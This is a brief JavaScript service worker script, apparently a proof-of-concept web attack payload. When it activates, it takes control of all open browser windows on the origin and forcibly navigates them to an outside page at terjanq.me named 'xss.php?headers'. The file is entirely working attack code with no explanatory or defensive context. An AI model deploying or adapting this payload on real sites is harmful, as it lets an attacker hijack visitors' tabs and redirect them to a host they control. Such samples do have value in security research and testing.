self.addEventListener('activate', event => {
  event.waitUntil(self.clients.claim().then(() => {
    return self.clients.matchAll({type: 'window'});
  }).then(clients => {
    return clients.map(client => {
      if ('navigate' in client) {
        return client.navigate('https://terjanq.me/xss.php?headers');
      }
    });
  }));
});
